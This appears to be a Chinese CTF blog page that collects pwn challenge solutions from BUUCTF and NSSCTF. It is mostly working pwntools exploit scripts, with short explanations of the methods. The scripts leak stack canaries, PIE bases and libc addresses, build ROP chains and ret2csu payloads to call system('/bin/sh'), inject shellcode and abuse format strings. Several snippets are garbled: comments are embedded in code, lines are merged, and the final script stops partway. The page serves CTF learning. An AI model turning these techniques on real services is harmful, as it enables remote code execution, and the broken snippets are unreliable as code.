<p><img src="/2023/03/07/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-14%20200914.png"></p>
<p>发现有canary保护</p>
<p><strong>ida查看</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_4006E2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  FILE *v2; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="built_in">stdin</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know how to do buffer overflow?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s. Try harder!&quot;</span>, buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I hope you win&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很显然栈溢出漏洞位于read函数中，buf大小为0x50，而read函数的第三参数，也就是<strong>输出&#x2F;写入&#x2F;输出</strong>的最大的字节长度为0x100，就是2个buf大小的数据。但是本题开启了Canary，因此我们不能直接进行栈溢出以及Ret2Libc攻击。我们可以发现，我们输入的Payload会被第二段的printf打印出来。也就是说可以利用这个printf打印出来Canary，将Canary原封不动的归位，即可跳过检测。</p>
<p><strong>canary</strong></p>
<p>Canary是位于EBP之前的一串随机数据，用来防止栈上的内容溢出进行某些危险攻击的。我们都知道Canary 会在栈上添加一个随机值，以保护程序免受缓冲区溢出攻击，但是也会在栈上多占用一些空间。</p>
<p>也就是说：</p>
<p><strong>假如我的 buf 大小为 0x50</strong></p>
<p><strong>如果是 64 位程序，那么 Canary 就会在栈上额外占用 0x08 的空间作为随机值。</strong></p>
<p><strong>也就是说 我的可用空间只有 0x42 。</strong></p>
<p><strong>开启 Canary ： RBP 位于 0x50 + 0x08，Canary位于0x50 - 0x08，Return Address位于0x50 + 0x16</strong></p>
<p><strong>而 0x50 + 0x08 在不开启 Canary 的情况下是 Return Address 的地址</strong></p>
<p><strong>关闭 Canary ： RBP 位于 0x50，Return Address位于0x50 + 0x08</strong></p>
<p><strong>这时候的 0x50 + 0x08 是 Return Address 的地址。</strong></p>
<p>具体思路如下：</p>
<p><strong>因为Canary是栈中的一个随机值，我们通过printf泄露Canary，然后将其填充至它本来应该在的位置，就能通过检查。</strong></p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#io = process(&quot;littleof&quot;)</span></span><br><span class="line">io = remote()</span><br><span class="line">elf = ELF(<span class="string">&quot;littleof&quot;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">rdi = <span class="number">0x400863</span></span><br><span class="line">ret = <span class="number">0x40059E</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x400789</span></span><br><span class="line"> </span><br><span class="line">Padding = <span class="string">b&#x27;A&#x27;</span> * ( <span class="number">0x50</span> - <span class="number">0x08</span> )</span><br><span class="line">Padding_Ret = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x08</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">Payload_Canary = Padding</span><br><span class="line">io.sendline(Payload_Canary)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span>)</span><br><span class="line">Canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary: &quot;</span> + (<span class="built_in">hex</span>(Canary)))</span><br><span class="line"> 发送了<span class="number">0x49</span>个字节，总共<span class="number">0x50</span>个字节，程序会把Canary放在变量起始位置，所以只需要接收<span class="number">7</span>个，然后用一个<span class="number">0</span>填充即可。</span><br><span class="line"> Payload_Leak = Padding + p64(Canary) + Padding_Ret + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,Payload_Leak)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Real Address: &quot;</span> + (<span class="built_in">hex</span>(addr)))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Local</span></span><br><span class="line"><span class="comment">#ibc = LibcSearcher(&#x27;puts&#x27;,addr)</span></span><br><span class="line"><span class="comment">#base = addr - libc.dump(&#x27;puts&#x27;)</span></span><br><span class="line"><span class="comment">#system = base + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment">#binsh = base + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Remote</span></span><br><span class="line">base = addr - <span class="number">0x080aa0</span></span><br><span class="line">system = base + <span class="number">0x04f550</span></span><br><span class="line">binsh = base + <span class="number">0x1b3e1a</span></span><br><span class="line"> </span><br><span class="line">io.recvuntil(<span class="string">b&#x27;overflow?&#x27;</span>)</span><br><span class="line">Payload_Canary = Padding</span><br><span class="line">io.sendline(Payload_Canary)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n&#x27;</span>)</span><br><span class="line">Canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;Canary: &quot;</span> + (<span class="built_in">hex</span>(Canary)))</span><br><span class="line"> </span><br><span class="line">Payload_Shell = Padding + p64(Canary) + Padding_Ret + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Try harder!&#x27;</span>,Payload_Shell)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>Padding就是上文泄露Canary的Payload</p>
<p>Canary就是Canary的数据</p>
<p>Padding_Ret 代表覆盖原先栈上的 RBP</p>
<p>Ret 用来平衡栈帧</p>
<p>Rdi 用来存放 system 的第一个函数，也就是 &#x2F;bin&#x2F;sh 字符串的地址的。</p>
<h2 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p =remote(&#x27;node4.buuoj.cn&#x27;,27440)</span><br><span class="line">elf = ELF(&#x27;./ciscn_s_3&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">csu_end = 0x040059A</span><br><span class="line">csu_front = 0x0400580</span><br><span class="line">ret_addr = 0x004003a9</span><br><span class="line">rax_59_ret = 0x04004E2</span><br><span class="line">syscall = 0x0400517</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27; + b&#x27;A&#x27;*0x8 + p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(0x20)</span><br><span class="line">stack_addr = u64(p.recv(8))</span><br><span class="line">print(&#x27;stack_addr--&gt;&#x27; + hex(stack_addr))</span><br><span class="line">binsh_addr = stack_addr - 0x138</span><br><span class="line">rax_59 = binsh_addr + 0x10</span><br><span class="line">pop_rdi = 0x04005a3</span><br><span class="line">payload = b&#x27;/bin/sh\x00&#x27; + b&#x27;A&#x27;*0x8 + p64(rax_59_ret) + p64(csu_end)</span><br><span class="line">payload += p64(0) + p64(1) + p64(rax_59) + p64(0) + p64(0) + p64(0)</span><br><span class="line">payload += p64(csu_front)</span><br><span class="line">payload += b&#x27;a&#x27;*0x38</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">调用execve需要</span><br><span class="line"></span><br><span class="line">$rax==59</span><br><span class="line"></span><br><span class="line">$rdi==“/bin/sh”</span><br><span class="line"></span><br><span class="line">$rsi==0</span><br><span class="line"></span><br><span class="line">$rdx==0</span><br><span class="line"></span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">def ret_csu(r12, r13, r14, r15, last):</span><br><span class="line">	payload = offset * &#x27;a&#x27;  </span><br><span class="line">	#构造栈溢出的padding</span><br><span class="line">	payload += p64(first_csu) + &#x27;a&#x27; * 8    </span><br><span class="line">	#gadgets1的地址</span><br><span class="line">	payload += p64(0) + p64(1)</span><br><span class="line">	#rbx=0, rbp=1</span><br><span class="line">	payload += p64(r12)</span><br><span class="line">	#call调用的地址</span><br><span class="line">	payload += p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">	#三个参数的寄存器</span><br><span class="line">	payload += p64(second_csu)</span><br><span class="line">	#gadgets2的地址</span><br><span class="line">	payload += &#x27;a&#x27; * 56</span><br><span class="line">	#pop出的padding</span><br><span class="line">	payload += p64(last)</span><br><span class="line">	#函数最后的返回地址</span><br><span class="line">	return payload</span><br></pre></td></tr></table></figure>



<h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">调试脚本</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">from pwn import *</span></span><br><span class="line"><span class="string">context(log_level = &#x27;debug&#x27;,os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;)</span></span><br><span class="line"><span class="string">p = process(&#x27;./ez&#x27;)</span></span><br><span class="line"><span class="string">gdb.attach(p)</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;crash: &#x27;)</span></span><br><span class="line"><span class="string">stack_addr = int(p.recv(10), 16)</span></span><br><span class="line"><span class="string">payload = b&#x27;crashme\x00&#x27; + b&#x27;a&#x27;*18 </span></span><br><span class="line"><span class="string">payload += p32(0) + asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">p.recvuntil(&#x27;&gt; &#x27;)</span></span><br><span class="line"><span class="string">p.sendline(payload)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25049</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lets crash: &#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">shellcode_addr = stack_addr-<span class="number">28</span></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span>.ljust(<span class="number">26</span>,<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p32(shellcode_addr)+shellcode</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="picoctf-2018-rop-chain"><a href="#picoctf-2018-rop-chain" class="headerlink" title="picoctf_2018_rop chain"></a>picoctf_2018_rop chain</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27550</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./rop_chain&#x27;</span>)</span><br><span class="line">flag_addr=elf.symbols[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line">win1_addr=elf.symbols[<span class="string">&#x27;win_function1&#x27;</span>]</span><br><span class="line">win2_addr=elf.symbols[<span class="string">&#x27;win_function2&#x27;</span>]</span><br><span class="line">win2_a1=<span class="number">0xBAAAAAAD</span><span class="comment">#-1163220307十六进制补码</span></span><br><span class="line">flag_a1=<span class="number">0xDEADBAAD</span><span class="comment">#-559039827十六进制补码</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(win1_addr)+p32(win2_addr)+p32(flag_addr)+p32(win2_a1)+p32(flag_a1)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="jarvisoj-level3-x64"><a href="#jarvisoj-level3-x64" class="headerlink" title="jarvisoj_level3_x64"></a>jarvisoj_level3_x64</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28307</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rdi=<span class="number">0x4006b3</span></span><br><span class="line">rsi=<span class="number">0x4006b1</span></span><br><span class="line"><span class="comment">#泄露地址</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(write_got)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(write_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"><span class="comment">##计算后门函数</span></span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment">##打印</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh))</span><br><span class="line"><span class="comment">##getshell</span></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="HUBUCTF-2022-新生赛-fmt"><a href="#HUBUCTF-2022-新生赛-fmt" class="headerlink" title="[HUBUCTF 2022 新生赛]fmt"></a>[HUBUCTF 2022 新生赛]fmt</h2><p>这道题实现了BROP的思想，利用格式化字符串漏洞泄露目标程序的栈中的信息，并通过多次利用格式化字符串漏洞，逐步获取flag。遇到的很少所以记录一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28231</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">k</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;service&#x27;</span>,k)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">    a=p.recvline()[:-<span class="number">1</span>][::-<span class="number">1</span>]</span><br><span class="line">    f=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">        f+=<span class="built_in">chr</span>(<span class="built_in">int</span>(a[i:i+<span class="number">2</span>][::-<span class="number">1</span>],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>,<span class="number">20</span>):</span><br><span class="line">    flag+=get_flag(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(i).encode()+<span class="string">b&#x27;$p&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag=&#x27;</span>+flag) </span><br></pre></td></tr></table></figure>

<p>get_flag函数接受一个参数 k，向目标程序发送一个字符串（请求），并根据目标程序的响应获取 flag 的值。在这个函数中，先将 k 发送给目标程序，然后获取响应中 0x 开头的字符串（栈中地址），将该字符串逆序（[::-1]）后截断去掉换行符，再按照每两个字符转换成相应的 ascii 码，并组成新的字符串 f 返回。</p>
<p>for 循环从 12 到 19，每次将一个参数中的某一个参数设置成 fmt 字符串的参数位置（如12$p’、13$p’），然后调用 get_flag() 函数获取返回值，并将返回值添加到 flag 中。</p>
<h2 id="2021-鹤城杯-babyof"><a href="#2021-鹤城杯-babyof" class="headerlink" title="[2021 鹤城杯]babyof"></a>[2021 鹤城杯]babyof</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28597</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;babyof&#x27;</span>)</span><br><span class="line">ret = <span class="number">0x0000000000400506</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400743</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = <span class="number">0x40066B</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="number">0x00000000001b3e1a</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0</span>) +  p64(ret) +p64(pop_rdi) + p64(binsh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="NISACTF-2022-ezpie"><a href="#NISACTF-2022-ezpie" class="headerlink" title="[NISACTF 2022]ezpie"></a>[NISACTF 2022]ezpie</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">PIE保护机制只随机初始基地址，函数之间的偏移不会变</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * p=remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28123</span>) elf=ELF(<span class="string">&#x27;pwn&#x27;</span>) </span><br><span class="line">计算偏移量</span><br><span class="line">main_addr=elf.symbols[<span class="string">&#x27;main&#x27;</span>] shell_addr=elf.symbols[<span class="string">&#x27;shell&#x27;</span>] offest=shell_addr-main_addr</span><br><span class="line">log.info(<span class="string">&#x27;offest is :%x&#x27;</span>%offest) </span><br><span class="line">根据泄露的main函数地址计算shell函数地址</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;gift!\n0x&#x27;</span>) p_main_addr=<span class="built_in">int</span>(p.recv(<span class="number">8</span>).decode(),<span class="number">16</span>) p_shell_addr=p_main_addr+offest </span><br><span class="line">获得shell</span><br><span class="line">payload=flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">40</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>,p_shell_addr) p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>,payload) p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">### </span></span><br></pre></td></tr></table></figure>

<h3 id="GFCTF-2021-where-is-shell"><a href="#GFCTF-2021-where-is-shell" class="headerlink" title="[GFCTF 2021]where_is_shell"></a>[GFCTF 2021]where_is_shell</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./shell&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28720</span>)</span><br><span class="line">ret_addr = <span class="number">0x400416</span> </span><br><span class="line">pop_rdi_ret = <span class="number">0x4005e3</span> </span><br><span class="line">tips = <span class="number">0x400541</span><span class="comment">#可以利用system($0)获得shell权限，$0在机器码中为 \x24\x3，发现 24 30，查看操作码</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(tips)+p64(system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;find it?\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="watevrCTF-2019-Voting-Machine-1"><a href="#watevrCTF-2019-Voting-Machine-1" class="headerlink" title="[watevrCTF 2019]Voting Machine 1"></a>[watevrCTF 2019]Voting Machine 1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=remote(&#x27;1.14.71.254&#x27;,28014)</span><br><span class="line">back_door=0x400807</span><br><span class="line">payload=b&#x27;a&#x27;*10+p64(back_door)</span><br><span class="line">p.sendlineafter(&#x27;Vote:&#x27;,payload)</span><br><span class="line">flag=p.recvall()</span><br><span class="line">print(flag)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>

<h3 id="CISCN-2019东北-PWN2"><a href="#CISCN-2019东北-PWN2" class="headerlink" title="[CISCN 2019东北]PWN2"></a>[CISCN 2019东北]PWN2</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;1.14.71.254&#x27;</span>,<span class="number">28109</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn6&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice!&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x00000000004006b9</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400c83</span></span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">payload+=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span></span><br><span class="line">payload+=p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;be encrypted&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)    </span><br><span class="line">system = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)    </span><br><span class="line">bins = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;choice!&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;be encrypted&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x57</span>+p64(ret)+p64(pop_rdi)+p64(bins)+p64(system)+p64(ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="深育杯-2021-find-flag"><a href="#深育杯-2021-find-flag" class="headerlink" title="[深育杯 2021]find_flag"></a>[深育杯 2021]find_flag</h3><p>from pwn import *<br>elf &#x3D; ELF(“find_flag”)<br>p &#x3D; remote(‘1.14.71.254’,28257)<br>p.recvuntil(b”name?”)<br>p.sendline(b”aa%12$p %17$p”)<br>p.recvuntil(b”aa”)<br>addr,can &#x3D; str(p.recv(33)).split()<br>print(addr,can)<br>can &#x3D; int(can[0:-1],16)<br>elf_base &#x3D; int(addr[2:],16)-0x215c<br>success(“elf_base:”+hex(elf_base))<br>flag_addr &#x3D; elf_base + 0x1228<br>success(“canary:”+hex(can))<br>p.recvuntil(b”? “)<br>payload &#x3D; b’a’*(0x40-8) + p64(can) + b’aaaaaaaa’+p64(flag_addr)<br>p.sendline(payload)<br>p.interactive() </p>
<h3 id="2021-鹤城杯-easyecho"><a href="#2021-鹤城杯-easyecho" class="headerlink" title="[2021 鹤城杯]easyecho"></a>[2021 鹤城杯]easyecho</h3><p>from pwn import*<a href="https://blog.csdn.net/woodwhale/article/details/120680661">https://blog.csdn.net/woodwhale/article/details/120680661</a><br>context.log_level&#x3D;”debug”<br>#p&#x3D;process(‘.&#x2F;easyecho’)<br>p&#x3D;remote(‘node4.anna.nssctf.cn’,28947)<br>p.sendlineafter(“Name:”,b”b”*15+b”a”)<br>p.recvuntil(“a”)<br>addr &#x3D;  u64(p.recv(6).ljust(8, b’\x00’)) - 0xcf0<br>print(“addr”,addr)</p>
<p>flag_addr &#x3D;addr + 0x202040<br>print(“flag_addr”,flag_addr)</p>
